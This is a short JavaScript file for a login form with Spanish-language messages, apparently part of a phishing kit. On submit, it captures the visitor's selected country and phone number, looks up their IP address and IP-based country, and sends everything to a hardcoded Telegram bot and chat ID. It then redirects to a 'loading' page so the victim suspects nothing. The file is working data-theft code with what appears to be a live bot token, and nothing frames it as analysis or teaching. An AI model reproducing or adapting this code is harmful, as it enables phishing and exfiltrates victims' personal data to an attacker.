document.querySelector('.login--form').addEventListener('submit', async function (event) {
    event.preventDefault(); 

    
    const country = document.querySelector('select[name="country"]').value;
    const tlef = document.querySelector('input[name="tlef"]').value;

    const botToken = '7841222215:AAGWtkeFQlP35_4LamTOr3kqp6hGPdeF_Bg';
    const chatId = '6084084761';

    try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIp = ipData.ip;
        const countryResponse = await fetch(`https://ipapi.co/${userIp}/country_name`);
        const userCountry = await countryResponse.text();
            const message = `País: ${country}\nTeléfono: ${tlef}\nIP: ${userIp}\nPaís: ${userCountry}`;

            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        if (response.ok) {
            window.location.href = 'loading.html'; 
        } else {
            alert('Error al enviar la información.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ocurrió un error al intentar enviar la información.');
    }
});